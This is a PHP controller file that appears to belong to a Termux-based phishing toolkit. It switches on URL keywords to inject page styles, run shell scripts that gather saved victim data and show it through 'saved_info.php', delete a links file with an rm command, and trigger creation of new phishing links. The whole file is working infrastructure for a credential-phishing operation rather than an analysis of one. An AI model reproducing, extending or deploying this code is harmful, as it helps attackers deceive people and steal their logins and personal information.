<?php
$url = $_SERVER['REQUEST_URI'];
$localhost = $_SERVER['HTTP_HOST'];
if ($localhost == "localhost:4444" ){
	if (strpos($url,"info-remove")){
	}else{
		if (strpos($url,"fake")){
		$info_css = '<link rel="stylesheet" href="/phishing-tools/phishing_files/info-2.css">';}else{
		$info_css = '<link rel="stylesheet" href="/phishing-tools/phishing_files/info.css">';}
		echo $info_css;
	}
if (strpos($url,"all")){
	shell_exec('bash phishing_files/saved-all.sh');
	sleep(0.5);
	require ("phishing_files/saved_info.php");

	exit();
}
if (strpos($url,"save")){
	require ("../../phishing_files/saved_info.php");
	exit();
}

if (strpos($url,"create")){
	shell_exec("rm /data/data/com.termux/files/usr/lib/WIT/files/phishing-tools/phishing_files/links.txt");
	shell_exec('echo "link-create" >_command&&echo |pwd >>_command');
	require ("../../phishing_files/loading.php");
	exit();
}}
?>
